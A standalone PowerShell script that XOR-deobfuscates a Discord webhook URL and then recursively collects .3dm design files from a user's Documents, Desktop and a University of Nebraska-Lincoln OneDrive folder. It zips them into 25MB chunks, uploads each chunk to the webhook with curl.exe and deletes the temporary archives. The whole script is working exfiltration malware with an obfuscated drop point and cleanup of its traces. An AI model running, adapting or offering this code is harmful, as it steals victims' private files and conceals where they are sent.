# Discord webhook (XOR semi-obfuscated)
$hookurl = "https://discord.com/api/webhooks/" + (-join ('1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF'.ToCharArray() | ForEach-Object { [char]([byte][char]$_ -bxor 0x33) }))

# Target only .3dm files in these locations
$foldersToSearch = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive - University of Nebraska-Lincoln"
)
$fileExtensions = @("*.3dm")

# Zip and upload function
function Exfiltrate {
    $maxZipSize = 25MB
    $currentSize = 0
    $index = 1
    $zipPath = "$env:temp\Data$index.zip"

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')

    foreach ($folder in $foldersToSearch) {
        $files = Get-ChildItem -Path $folder -Filter "*.3dm" -Recurse -File -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentSize + $fileSize -gt $maxZipSize) {
                $zip.Dispose()
                curl.exe -F "file1=@$zipPath" $hookurl
                Remove-Item $zipPath -Force
                Start-Sleep -Milliseconds 800
                
                $index++
                $zipPath = "$env:temp\Data$index.zip"
                $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
                $currentSize = 0
            }
            
            $entryName = $file.FullName.Substring($folder.Length + 1)
            [void][System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $file.FullName, $entryName)
            $currentSize += $fileSize
        }
    }

    if ((Get-Item $zipPath).Length -gt 0) {
        $zip.Dispose()
        curl.exe -F "file1=@$zipPath" $hookurl
    }
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

Exfiltrate
